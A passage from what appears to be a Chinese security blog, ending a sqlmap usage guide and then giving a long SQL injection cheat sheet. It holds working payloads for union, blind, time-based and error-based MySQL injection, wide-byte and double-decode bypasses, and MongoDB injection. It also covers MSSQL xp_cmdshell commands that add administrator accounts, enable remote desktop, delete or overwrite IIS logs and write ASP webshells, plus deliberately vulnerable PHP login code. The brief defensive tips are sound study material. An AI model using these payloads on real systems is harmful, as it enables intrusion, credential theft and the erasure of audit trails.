sqlmap支持HTTPS，可以在命令后加上--force-ssl强制使用SSL连接到443/tcp端口。也可以在Host头后加上:443来使用HTTPS。 将Google搜索结果作为目标1-g sqlmap获取google搜索的前100个结果，对其中有GET参数的URL进行测试并询问是否测试每一个URL。 For example: 1$ python sqlmap.py -g &quot;inurl:\\&quot;.php?id=1\\&quot;&quot; 从配置文件中载入目标1-c 将攻击目标及各种参数写在配置文件中，sqlmap可以通过加载配置文件对目标进行测试。在sqlmap的安装根目录下有sqlmap.conf文件，这是配置文件的模板，可以根据需求写入参数。 RequestHTTP 请求方式1--method sqlmap会自动检测正确的HTTP请求方式。然而，在一些情况下，需要使用不会自动识别的特殊HTTP请求方式，例如PUT，这时就需要指定请求方式。 For example: 1--method=PUT HTTP POST数据1--data 默认情况下，sqlmap使用GET，但你可以通过提供POST数据将请求方式改为POST。这些数据会被当做SQL注入测试的参数。 For example: 1$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;id=1&quot; -f --banner --dbs --users 指定参数分割符1--param-del 有些情况下，默认参数分割符(e.g. GET和POST中的&amp;)需要被指定为新的分割符来保证sqlmap可以正常差分并处理每个参数。 For example: 12$ python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=\\1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users HTTPCookie 1234--cookie--cookie-del--load-cookies--drop-set-cookie 使用这些参数的2中情况： 测试页面需要基于cookie的登录认证，并且你有这些数据 想要测试cookie注入(当--level设置为2或更高时，sqlmap会检测cookie注入) 两种情况均需要使用sqlmap发送cookie，可以使用下方步骤发送cookie 登录网页 从浏览器中获取cookie 将第二步获得cookie作为--cookie的值 注意，HTTP cookie中的值通常由;来分割，而不是&amp;。sqlmap可以从GET和POST参数中，分辨出cookie并将其作为独立参数。为了防止分割符不是;可以通过–-cookie-del来设置分割符。 在后续的连接中，若HTTP响应头仍有Set-Cookie，sqlmap会自动使用之前设置的cookie，并测试这些值。可以通过--drop-set-cookie参数使sqlmap忽略Set-Cookie。 反之，如果你提供了一个HTTPCookie头，并且使用了--cookie，而且目标URL每次都发送HTTP Set-Cookie，这时，sqlmap会询问你要为HTTP请求使用哪组cookie。 可以使用--load-cookies载入文件中包含的Netscape/wget格式的cookie。 参考[1] sqlmap_Usage [2] Sqlmap中文手册","categories":[],"tags":[{"name":"工具使用","slug":"工具使用","permalink":"https://chirec.github.io/tags/工具使用/"}]},{"title":"'SQL注入总结'","slug":"Sql-Injection","date":"2019-04-11T12:15:59.000Z","updated":"2019-05-03T12:02:03.381Z","comments":true,"path":"2019/04/11/Sql-Injection/","link":"","permalink":"https://chirec.github.io/2019/04/11/Sql-Injection/","excerpt":"1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件","text":"1. SQL注入原理前端有一个参数用户可控服务器对该参数没有过滤或过滤不严谨本质：把用户输入的数据当作代码来执行，违背了“数据与代码分离”的原则 2. SQL注入危害读取数据库的数据修改或删除数据getshell往服务器读写文件 3. 显错注入3.1 常用函数3.1.1 显示信息12345678user() @@hostnameversion() @@versiondatabase() @@tmpdir@@datadir@@basedir 3.1.2 拼接字段123456concat() 拼接多个字符串concat(username,0x7e,password)group_concat() 拼接表头group_concat(username,password)concat_ws() 拼接字符串，第一个字符串为分割符concat_ws(0x7e,username,password) 3.1.3 截取字段12345mid() 适用于MySQLsubstr() 适用于Oracle MySQL SQLSERVERsubstring() 适用于MySQL SQLSERVERleft()right() 3.1.4 条件判断123if(判断的条件，条件为真返回值，条件为假返回值)select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;); 123case when 判断的条件 then 条件为真返回值 else 条件为假返回值 endselect case when 1=1 then &apos;true&apos; else &apos;false&apos; end;select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end; 3.1.5 判断字段数1order by 3.2 数据库的注释12345#%23--+--&amp;nbsp--%20 3.3 union 联合查询联合查询的前后字段数要求相同 1select uname,password,gender from users union select 1,2,3; 3.4 系统数据库3.4.1 information_schemamysql版本5.0以上，系统自带。汇总所有数据库的库名、表名、字段名。 3.4.1.1 columns表 字段名 存放数据 table_schema 存放所有数据库的库名 table_name 存放所有表名 column_name 存放所有字段名 privileges 存放可操作语句 3.4.1.2 tables表 字段名 存放数据 table_schema 存放所有数据库的库名 table_name 存放所有表名 3.4.2 常用查询3.4.2.1 查询所有数据库的库名1select distinct table_schema from information_schema.columns; 3.4.2.2 查询数据库中某个数据库中的所有表名1select distinct table_name from information_schema.columns where table_schema=&apos;chessur&apos;; 3.4.2.3 查询数据库中某个数据库中某个表的所有字段名1select distinct column_name from information_schema.columns where table_schema=&apos;chessur&apos; and table_name=&apos;users&apos;; 3.5 手工注入流程3.5.1 Step 1 判断是否有注入判断从后台数据库中选取的列数，判断哪几列在前端显示 3.5.2 Step 2 收集数据库信息（用户名，版本，当前数据库名）123select version();select user();select database(); 3.5.3 Step 3 获取当前数据库下的所有表名1select group_concat(distinct table_name) from information_schema.columns where table_schema=database(); 3.5.4 Step 4 获取当前数据库下指定表中字段名1select group_concat(distinct table_name) from information_schema.columns where table_schema=database() and table_name=&apos;users&apos;; 3.5.5 Step 5 获取字段对应的数据1select group_concat(distinct password) from users; 3.5.6 Step 6 解密数据数据库中有些数据会加密存放，所以需要解密。 4. 盲注因为不能回显错误信息，所以盲注要一个字符一个字符的尝试，通过二分法可以节省很多时间。 4.1 常用函数4.1.1 显示字段长度1length() 4.1.2 显示ASCII12ascii()ord() 4.1.3 截取字段12345mid() 适用于MySQLsubstr() 适用于Oracle MySQL SQLSERVERsubstring() 适用于MySQL SQLSERVERleft()right() 4.1.4 等待函数1sleep() 1benchmark() 4.2 布尔盲注4.2.1 Step 1 探测注入点123?id=1&apos; ?id=1&apos; and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 # 根据页面的显示效果判断是否有注入点 4.2.2 Step 2 收集数据信息收集当前用户名、当前数据库、当前数据库版本 1and substr((select version()),1,1)&gt;4 //判断数据库版本是否大于4 5.0以上的mysql数据库有information_schema数据库。 4.2.3 Step 3 查询当前数据库中的表名12and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),1,1))=33 //判断第一个字符and ord(substr((select group_concat(distinct table_name)from information_schema.columns where table_schema=database()),2,1))=33 //判断第二个字符 12345and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第一个表名长度and length((select table_name from information_schema.columns where table_schema=database() limt 1,1)) //第二个表名长度and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),1,1)) //第一个表的第一个字符and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 0,1),2,1)) //第一个表的第二个字符and ascii(substr((select distinct table_name from information_schema.columns where table_schema=database() limit 1,1),1,1)) //第二个表的第一个字符 4.2.4 Step 4 获取指定表的字段名123and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33 //判断第一个字段的第一个字符and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33 //判断第一个字段的第二个字符and ascii(substr((select distinct column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33 //判断第二个字段的第一个字符 4.2.5 Step 5 获取字段数据123and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第一个数据的第一个字符and ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33 //判断第一个数据的第二个字符and ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33 //判断第二个数据的第一个字符 4.3 延时注入无法通过布尔盲注来判断SQL语句是否执行成功时，可以尝试报错延时注入。延时注入也叫基于时间的盲注。判断依据：页面加载时间延时注入使用条件判断语句以及等待函数来判断SQL语句是否执行成功。 4.3.1 延时函数4.3.1.1 sleep()1sleep(5) //让数据库等待5秒，再返回结果 4.3.1.2 benchmark()1benchmark(500000000,md5(&apos;abc&apos;)) 4.3.1.3 Heavy Query有些时候，无法使用延时函数来进行延时注入。这种情况下，最好的选择是使用数据库需要执行很久的sql语句。 1SELECT count(*) FROM information_schema.columns A, information_schema.columns B, information_schema.columns C 上面这个语句，在我的数据库中执行了22.15秒 4.3.2 条件判断123if(判断的条件，条件为真返回值，条件为假返回值)select if(&quot;1=1&quot;,&apos;true&apos;,&apos;false&apos;);select if(ascii(substr(database(),1,1))&gt;92,&apos;true&apos;,&apos;false&apos;); 123case when 判断的条件 then 条件为真返回值 else 条件为假返回值 endselect case when 1=1 then &apos;true&apos; else &apos;false&apos; end;select case when ascii(substr(database(),1,1))&gt;92 then &apos;true&apos; else &apos;false&apos; end; 4.3.3 基本构造1?id=1&apos; and if(1=1,1,sleep(5)) # 4.3.4 注入流程4.3.4.1 Step 1 探测注入点123?id=1&apos; ?id=1&apos; and 1=1 #?id=1&apos; and &apos;1&apos;=&apos;1 # 4.3.4.2 Step 2 收集数据信息123?id=1 and if(substr(version(),1,1)&gt;4,1,sleep(5)) #?id=1 and if(ord(substr(database(),1,1))=33,1,sleep(5)) #?id=1 and if(ord(substr(database(),2,1))=33,1,sleep(5)) # 4.3.4.3 Step 3 查询当前数据库中的表名123?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),1,1))=33,1,sleep(5))?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 0,1),2,1))=33,1,sleep(5))?id=1 and if(ord(substr((select table_name from information_schema.columns where table_schema=database() limit 1,1),1,1))=33,1,sleep(5)) 4.3.4.4 Step 4 查询指定表的字段名123?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),1,1))=33,1,sleep(5))?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 0,1),2,1))=33,1,sleep(5))?id=1 and if(ord(substr((select column_name from information_schema.columns where table_schema=database() and table_name=users limit 1,1),1,1))=33,1,sleep(5)) 4.3.4.5 Step 5 获取字段数据123and if(ascii(substr((select concat(username,password)from users limit 0,1),1,1))=33,1,sleep(5))and if(ascii(substr((select concat(username,password)from users limit 0,1),2,1))=33,1,sleep(5))and if(ascii(substr((select concat(username,password)from users limit 1,1),1,1))=33,1,sleep(5)) 4.4 DNSlog在盲注中的使用4.4.15. 报错注入5.1 extractvalue(参数1，参数2)从目标XML中返回查询的字符串，参数1是string格式，XML文档名，参数2是XPATH格式，要查询的字符串 1select extractvalue(1,concat(0x7e,(select user()),0x7e)) 5.2 updatexml(参数1，参数2，参数3)改变文档中符合条件的节点的值，参数1是XML文档，参数2是XPATH格式的字符串，参数3是string格式的替换查找符合条件的数据 1select updatexml(1,concat(0x7e,(select user()),0x7e),1) 前两个报错函数的长度有限制 32位 5.3 floor()必须和count() rand() group by一起使用才能报错 1select * from messages where ID=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) 5.3.1 原理报错原因是主键重复，这个主键是虚拟表的主键。再进行group by查询过程中，先建立一张虚拟表，一行一行地插入内容，rand()函数也会多次计算，由于floor(rand(0)*2)能产生的值只有0和1，所以在第三次查询的时候就必然产生重复，所以第三次查询时必会报错。 1.查询前默认会建立空虚拟表 2.取第一条记录，执行floor(rand(0)*2)，发现结果为0(第一次计算),查询虚拟表，发现0的键值不存在，则floor(rand(0)*2)会被再计算一次，结果为1(第二次计算)，插入虚表，这时第一条记录查询完毕 3.查询第二条记录，再次计算floor(rand(0)*2)，发现结果为1(第三次计算)，查询虚表，发现1的键值存在，所以floor(rand(0)*2)不会被计算第二次，直接count(*)加1，第二条记录查询完毕 4.查询第三条记录，再次计算floor(rand(0)*2)，发现结果为0(第4次计算)，查询虚表，发现键值没有0，则数据库尝试插入一条新的数据，在插入数据时floor(rand(0)*2)被再次计算，作为虚表的主键，其值为1(第5次计算)，然而1这个主键已经存在于虚拟表中，而新计算的值也为1(主键键值必须唯一)，所以插入的时候就直接报错了。 5.整个查询过程floor(rand(0)*2)被计算了5次，查询原数据表3次，所以这就是为什么数据表中需要3条数据，使用该语句才会报错的原因。 From：【学习笔记】MYSQL的floor报错原理分析总结 5.4 GeometryCollection()1and GeometryCollection((select * from(select * from(select user ())a)b)) 5.5 NAME_CONST()1and (select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1)) as x) 只能用来暴版本信息 5.6 join12and (select * from(select * from mysql.user a join mysql.user b)c)and (select * from (select * from mysql.user as a join mysql.user as b) as c) 只能用来暴列名，在暴出第一个列名后，在b后加上using(columnname)可以暴出第二个列名，使用,分隔，多个列名 1and (select * from(select * from mysql.user a join mysql.user b using(Host,User,Password))c) 5.7 exp()1and exp(~(select * from (select user () ) a) ); 5.8 polygon()1and polygon (()select * from(select user ())a)b ); 5.9 multipoint()1and multipoint (()select * from(select user() )a)b ); 5.10 multlinestring ()1and multlinestring (()select * from(selectuser () )a)b ); 5.11 multpolygon ()1and multpolygon (()select * from(selectuser () )a)b ); 5.12 linestring ()1and linestring (()select * from(select user() )a)b ); 6. 伪静态注入6.1 伪静态网站页面展示时html一类的静态页面，但其实使用asp一类的动态脚本来处理的。 6.2 生成伪静态网站以PHP为例 6.2.1 开启Apache的mod_rewrite12/apache/conf/httpd.confLoadModule rewrite_module 6.2.2 让Apache支持.htacess12/apache/conf/httpd.confAllowOverride All 6.2.3 建立.htacess文件在文件中写入 12RewriteEngine onRewriteRule (.*)\\.html$ index.php?id=$1 RewriteRule 实质时正则表达式进行匹配，可以根据自己需求更改 6.3 分辨真/伪静态网站可以通过查看网页最后修改时间来判断在地址栏输入 1javascript:alert(document.lastModified) 如果得到的时间和现在时间一致，则为伪静态网站，反之是真静态网站。 6.4 手工注入6.4.1 判断注入点12?1&apos;/**/and/**/1=1/*.html ?1&apos;/**/and/**/1=2/*.html 6.4.2 Tips 伪静态的注入和URL的普通GET注入不太相同。普通url的get注入的%20,%23,+等都可以用；但是伪静态不行，会被直接传递到到url中，所以用/**/这个注释符号表示空格。From：伪静态注入的总结 7. 宽字节注入7.1 原理数据库中采用GBK编码，并对用户输入的数据进行转义GBK中汉字占用2个字节ASCII中汉字占用1个字节 7.2 常见转义函数1234addslaches()mysql_real_escape_string() //不会对%和_进行转义mysql_escape_string() //5.3及以后就废弃magic_quotes_gpc //魔术引号GPC模块 7.2.1 转义1234&apos; ---&gt; \\&apos;&quot; ---&gt; \\&quot;\\ ---&gt; \\\\NULL ---&gt; \\NULL 7.3 注入过程1234id=1%df&apos; id=1%df\\&apos; //&apos;转义为\\&apos;id=1%df%5c&apos; //\\的URL编码为%5cid=1運&apos; //%df%5c在数据库中因为GBK编码变为運，&apos;逃逸出来，形成注入点 7.4 手工注入和显错注入过程相同 7.5 PDO宽字节注入7.5.1 条件1.数据库使用GBK编码2.使用转义函数，如addslaches()3.PHP版本&lt;5.3.6 使用PDO连接数据库，没有参数过滤 7.5.2 防御7.5.2.1 使用mysqli_set_charset() 而不是 set namesmysqli_set_charset()和set names的区别查看深入理解SET NAMES和mysql(i)_set_charset的区别 7.5.2.2 使用mysql_real_escape_string()mysql_real_escape_string()与addslashes的不同之处在于其会考虑当前设置的字符集，不会出现前面df和5c拼接为一个宽字节的问题，使用mysqli_set_charset进行指定字符集 7.5.2.3 正确使用占位符确保每一个传入参数都先使用占位符进行代替 7.5.2.4 使用预处理注意，即使mysql版本支持预处理，某些语句mysql无法支持prepare，那么pdo在处理时还是会使用模拟预处理。这样可能会存在注入的风险。具体可以查看这篇回答：are-pdo-prepared-statements-sufficient-to-prevent-sql-injection 8. 二次解码注入8.1 原理浏览器出去的数据会被进行URL编码，到达服务器之后，默认会被URL解码mysql_real_escape_string()等转义函数是在urldecode()之前，所以并不能过滤由于urldecode()产生的单引号。 8.2 过程123id=1%2527id=1%27 //id=1&apos; //urldecode() 8.3 防御8.3.1 预处理使用PDO的prepare进行预编译处理数据库查询 8.3.2 过滤函数PHP常使用的过滤函数有addslashes()、mysql_escape_string()、msyql_real_string()、intval()函数等，在程序进行SQL语句运行之前使用。 8.3.3 魔术引号通常数据污染的方式有两种：一种是应用被动接收参数，类似于GET、POST等；另一种是主动获取参数，类似与读取远程桌面页面或者文件内容等。在PHP中魔术引号配置方法，magic_quotes_gpc负责对GET、POST、COOKIE的值进行过滤，magic_quotes_runtime对数据库或者文件中获取的数据进行过滤。 9. HTTP头部注入9.1 cookie注入post和get方式被过滤，只能通过cookie传递数据，刚好服务器没有过滤cookie数据，然后在cookie中添加测试的payload 1javascript:alert(document.cookie=&quot;id=&quot;+escape(&quot;25&quot;)) 9.2 XFF注入1python sqlmap.py -u &quot;&quot; --headers=&quot;x-forwarded-for:*&quot; -v --batch 10. 二次注入二次注入是指已存储（数据库、文件）的用户输入被读取后再次进入到 SQL 查询语句中导致的注入 10.1 原理在第一次进行数据库插入数据的时候，仅仅只是使用了 addslashes 或者是借助 get_magic_quotes_gpc 对其中的特殊字符进行了转义，在写入数据库的时候还是保留了原来的数据，但是数据本身还是脏数据 10.2 示例10.2.1 注册脏用户 10.2.2 退出重新登录 10.2.3 留言1,(select admin_pass from admin limit 0,1),1);# 10.2.4 二次注入结果 11. MSSQL注入11.1 注入过程11.1.1 Step 1：判断注入点和mysql数据库判断方式相同 1234and 1=1and 1=2/-0 11.1.2 Step 2：判断数据库类型1234select * from sysobjects?1 and exists(select * from sysobjects)and (select count(\\*) from sysobjects)&gt;0 mssqland (select count(\\*) from msysobjects)&gt;0 access 11.1.3 Step 3：注入点权限判断1234select IS_SRVROLEMEMBER(&apos;sysadmin&apos;);select IS_SRVROLEMEMBER(&apos;db_owner&apos;);select IS_SRVROLEMEMBER(&apos;public&apos;);//有public权限可以暴破表http://target.com?id=1 and 1=(select IS_SRVROLEMEMBER(&apos;sysadmin&apos;)) 11.1.4 Step 4：信息收集1234567891011数据库版本 select @@version http://target.com?id=1 and @@version&gt;0http://target.com?id=1 and 1=(select @@version)http://target.com?id=1 and user&gt;0查询当前数据库http://target.com?id=1 and 1=（select db_name()） http://target.com?id=1 and 1=(convert(int,db_name()))db_name(n)表示第几个数据库获取其他数据库SELECT top 1 Name FROM Master..SysDatabases where name not in (&apos;master&apos;,&apos;aspcms&apos;);select DB_NAME(1); 11.1.5 Step 5：获取当前数据库下的表12select top 1 name from aspcms.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0select top 1 name from aspcms.sys.all_objects where type=&apos;U&apos; AND is_ms_shipped=0 and name not in (&apos;AspCms_Collect_Content&apos;) 11.1.6 Step 6：获取当前数据库下指定表的字段名123如：AspCms_Userselect top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME=&apos;AspCms_User&apos;select top 1 COLUMN_NAME from aspcms.information_schema.columns where TABLE_NAME=&apos;AspCms_User&apos; and COLUMN_NAME not in (&apos;UserID&apos;,&apos;GroupID&apos;,&apos;LanguageID&apos;,&apos;SceneID&apos;,&apos;LoginName&apos;,&apos;Password&apos;) 11.1.7 Step 7：获取字段内容1234select top 1 LoginName from AspCms_Userselect top 1 Password from AspCms_Userselect top 1 LoginName from AspCms_User where LoginName not in (&apos;admin&apos;)http://target.com?id=1 and 1=(select top 1 Password from AspCms_User) 上面的都是通过类型不匹配，系统强制转换来显示数据 11.2 利用MSSQL扩展存储注入攻击11.2.1 检测与恢复扩展存储判断xp_cmdshe扩展存储是否存在1and 1=(select count(*) from master.dbo.sysobjects where xtype = &apos;x&apos; AND name = &apos;xp_cmdshell&apos;) 判断xp_regread扩展存储过程是否存在1and 1=(select count(*) from master.dbo.sysbojects where name=&apos;xp_regread&apos;) 恢复12EXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE;;exec sp_dropextendedproc xp_cmdshell,&apos;xplog70.dll&apos; 11.2.2 sa权限下扩展存储攻击利用方法11.2.2.1.利用xp_cmdshell扩展执行任意命令11.2.2.1.1 开启xp_cmdshell的方法12sql server20055下开启xp_cmdshellEXEC sp_configure &apos;show advanced options&apos;,1;RECONFIGURE;EXEC sp_configure &apos;xp_cmdshell&apos;,1;RECONFIGURE; 11.2.2.1.2 查看C盘1234;drop table black;create TABLE black(mulu varchar(7996) NULL,ID int NOT NULL IDENTITY(1,1))--;insert into black exec master..xp_cmdshell &apos;dir c:\\&apos;and 1= (select top 1 mulu from black where id =1) 11.2.2.1.3 新建用户12;exec master..xp_cmdshell &apos;net user test test /add&apos;;exec master..xp_cmdshell &apos;net localgroup administrators test /add&apos; 11.2.2.1.4 添加和删除一个SA权限的用户test （需要SA权限）12exec master.dbo.sp_addlogin test,passwordexec master.dbo.sp_addsrvrolemember test,sysadmin 11.2.2.1.5 停掉或激活某个服务 （需要SA权限）12exec master..xp_servicecontrol &apos;stop&apos;,&apos;schedule&apos;exec master..xp_servicecontrol &apos;start&apos;,&apos;schedule&apos; 11.2.2.1.6 爆网站目录123create table labeng(lala nvarchar(255),id int)DECLARE @result varchar(255) EXEC master.dbo.xp_regread &apos;HKEY_LOCAL_MACHINE&apos;,&apos;SYSTEM\\ControlSet001\\Services\\W3SVC\\Parameters\\Virtual Roots&apos;,&apos;/&apos;,@result output insert into labeng(lala) values(@result);and 1=(select top 1 lala from labeng)或者and 1=(select count(*) from labeng where lala&gt;1) 11.2.2.1.7 删除日志记录1;exec master.dbo.xp_cmdshell &apos;del c:\\winnt\\system32\\logfiles\\w3svc5\\ex070606.log&gt;c:\\temp.txt 11.2.2.1.8替换日志记录1;exec master.dbo.xp_cmdshell &apos;copy c:\\winnt\\system32\\logfiles\\w3svc5\\ex070404.log c:\\winnt\\system32\\logfiles\\w3svc5\\ex070606.log &gt;c:\\temp.txt&apos; 11.2.2.1.9 开启远程数据库1;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;server=servername;uid=sa;pwd=apachy_123&apos;,&apos;select * from table1&apos;) 11.2.2.1.10 开启远程数据库1;select * from OPENROWSET(&apos;SQLOLEDB&apos;,&apos;uid=sa;pwd=apachy_123;Network=DBMSSOCN;Address=202.100.100.1,1433;&apos;,&apos;select * from table&apos;) 11.2.2.1.11 打开338912345;exev master..xp_cmdshell &apos;sc config termservice start=auto&apos;;exec master..xp_cmdshell &apos;net start termservice&apos;;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /vfDenyTSConnection/t REG_DWORD/d 0x0 /f&apos; //允许外部连接;exec master..xp_cmdshell &apos;reg add &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\TerminalServer\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x50 /f&apos;//端口改为80 11.2.2.1.12 利用sp_makewebtask写入一句话木马1234;exec sp_makewebtask &apos;c:\\inetpub\\wwwroot\\x.asp&apos;,&apos;select&quot;%3c%25%65%76%61%6C%20%72%65%71%75%65%73%74%28%22%63%68%6F%70%70%65%72%22%29%25%3E&quot;&apos;--http://mssql.sql.com/aspx.aspx?id=1%20;exec%20sp_makewebtask%20%20%27c:\\inetpub\\wwwroot\\ms\\x1.asp%27,%27select%27%27&lt;%execute(request(&quot;cmd&quot;))%&gt;%27%27%27--修改管理员密码update admin set password=126326 where username=&apos;admin&apos;; 11.2.3 dbowner权限下的扩展攻击利用11.2.3.1.判断数据库用户权限1and 1=(select is_member(&apos;db_owner&apos;));-- 11.2.3.2.搜索web目录1234;create table temp(dir nvarchar(255),files varchar(255),files varchar(255),ID int NOT NULL IDENTITY(1,1));--;insert into temp(dir,depth,files)exec master.dbo.xp_dirtree &apos;c:&apos;,1,1--and (select dir from temp where id=1)&gt;0//由于不能一次性获取所有目录文件和文件夹名，因此需要更改ID的值，依次列出文件和文件夹 11.2.3.3.写入一句话木马找到web目录后，就可以写入一句话木马了 123456;alter database ssdown5 set RECOVERY FULL;create table test(str image)--;backup log ssdown5 to disk=&apos;c:\\test&apos; with init--;insert into test(str) values(&apos;&lt;%excute(request(&quot;cmd&quot;))%&gt;&apos;)--;backup log ssdown5 to disk=&apos;c:\\inetpub\\wwwroot\\x.asp&apos;--;alter database ssdown5 set RECOVERY simple 12. Nosql注入NOSQL(Not Only SQL) 12.1 MongoDB介绍和使用基于分布式文件存储数据库 使用C++开发，支持跨平台，可以存储任何数据(文件)允许在服务器端执行脚本，可以用JavaScript编写某些函数使用Json形式存储数据支持的编程语言：PHP、Ruby、Python、C++、C#、Java使用db表示数据库 12.1.1 sql和nosql结构对比 sql Nosql 解释/说明 database database 数据库 table collection(记录) 数据库表/集合 row 文件 数据记录行/文件 column field 数据字段域 index index 索引 table join / 表连接，MongoDB不支持 primary key primary key 主键，MongoDB自动将_id字段设置为主键 12.1.2 MongoDB使用12.1.2.1 对数据库的操作12.1.2.1.1 创建数据库1use databasename 12.1.2.2 查看当前数据库1db 12.1.2.3 查看所有数据库12show dbsshow databases 12.1.2.4 删除数据库1db.dropDatabase() 12.1.2.2 对集合的操作12.1.2.2.1查看所有集合12show tables;show collections; 12.1.2.2.2 创建集合1db.creatCollection(&quot;collectionname&quot;) 12.1.2.2.3 创建集合并插入数据1db.collectionname.insert(&#123;key:value,key2:value2&#125;) 12.1.2.2.4 删除集合1db.collectionname.drop() 12.1.2.3 对文档的操作12.1.2.3.1 查询表中所有文档1db.collectionname.find().pretty() 12.1.2.3.2 更新文档123db.collectionname.update(&lt;query&gt;,&lt;update&gt;)&lt;query&gt; 条件&lt;update&gt; 更新内容 12.1.2.3.2.1 更新单条数据1db.collectionname.update(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:18&#125;&#125;) 12.1.2.3.2.2更新多条数据1db.collectionname.update(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;,&#123;$set:&#123;&quot;age&quot;:18&#125;&#125;,&#123;multi:true&#125;) 12.1.2.3.2.3删除数据123db.collectionname.remove()db.collectionname.remove(&#123;&quot;username&quot;:&quot;Windy&quot;&#125;)db.collectionname.deleteMany(&#123;&#125;)//删除所有文档 12.1.2.4 查询语句12.1.2.4.1 有条件查询1234567= &#123;key:value&#125; 寻找key=value的文档&lt; &#123;key:&#123;&amp;lt:value&#125;&#125;&gt; &#123;key:&#123;&amp;gt:value&#125;&#125;&lt;= &#123;key:&#123;&amp;lte:value&#125;&#125;&gt;= &#123;key:&#123;&amp;gte:value&#125;&#125;!= &#123;key:&#123;&amp;ne:value&#125;&#125;$regex 1db.collectionname.find(&#123;key:&#123;&amp;ge:value&#125;&#125;) 12.1.2.4.2 and条件1db.collectionname.find(&#123;key:&#123;$gt:value&#125;,key2:&#123;$gt:value&#125;&#125;) 12.1.2.4.3 or条件1db.collectionname.find($or:[&#123;key:&#123;$gt:value&#125;,key:&#123;&amp;lt:value&#125;&#125;]) 12.1.2.4.4 正则查询1db.collectionname.find(&#123;key:&#123;$regex:&quot;regex&quot;&#125;&#125;) 12.2 PHP操作Mongodbmongo(面向过程) mongodb(面向对象) 12.3 MongoDB 注入注入类型分类：重言式、联合查询、JavaScript注入 12.3.1 重言式(永真式)1db.users.find(&#123;&quot;username&quot;:&#123;$ne:&quot;123&quot;&#125;,&quot;password&quot;:&#123;$ne:&quot;45&quot;&#125;&#125;) 1username[$ne]=love&amp;password[$ne]=love 12.3.1.1 正则1username[$regex]=^a&amp;password[$regex]=^1 12.3.2 联合查询在PHP新的mongo扩展和mongodb扩展中，已经停止对其支持。 12.3.3 JavaScript注入12345678910function login() &#123; var username = '\".$username.\"'; var password = '\".$password.\"'; if(username == 'admin' &amp;&amp; password == '123456') return true; else&#123; return false; &#125;&#125; 账号：a&#39; return true; var a=&#39;密码：1 12.3.4 Shell拼接利用1?username=&quot;&#125;);db.messages.insert(&#123;&quot;name&quot;:&quot;wangwu&quot;&#125;);db.messages.find(&#123;&quot;author&quot;:&quot;1 1db.messages.find(&#123;&quot;author&quot;:&quot;&apos;.$username.&apos;&quot;&#125;).sort(&#123;&quot;addtime&quot;:-1&#125;); 12.4 注入实验12.4.1 重言式注入12.4.1.1 代码12345678910111213141516171819202122232425262728293031323334353637383940&lt;?php$host = &apos;127.0.0.1&apos;;$port = &apos;27017&apos;;$username = &apos;&apos;;$password = &apos;&apos;;$tb_users = &apos;mymessage.users&apos;;$tb_messages = &apos;mymessage.messages&apos;;$manager = new MongoDB\\Driver\\Manager(&quot;mongodb://&#123;$host&#125;:&#123;$port&#125;&#125;&quot;);if (!empty($_POST[&apos;username&apos;]) &amp;&amp; !empty($_POST[&apos;password&apos;])) &#123; $username = $_POST[&apos;username&apos;]; $password = $_POST[&apos;password&apos;]; $query = array( &apos;username&apos; =&gt; $username, &apos;password&apos; =&gt; $password, ); $query = new MongoDB\\Driver\\Query($query); $cursor = $manager-&gt;executeQuery($tb_users, $query)-&gt;toArray(); if (count($cursor)&gt;0) &#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;登陆成功！&quot;);&lt;/script&gt;&apos;; &#125;else&#123; echo &apos;&lt;script language=&quot;JavaScript&quot; type=&quot;text/javascript&quot;&gt;alert(&quot;你的用户名或密码错误&quot;);&lt;/script&gt;&apos;; &#125;&#125;?&gt;&lt;center&gt;&lt;br /&gt;&lt;br /&gt;&lt;br /&gt; &lt;form action=&quot;login_2.php&quot; method=&apos;post&apos;&gt; &lt;h3&gt;名字：&lt;/h3&gt; &lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;width:10%;height:20px&quot;&gt; &lt;h3&gt;密码：&lt;/h3&gt; &lt;input 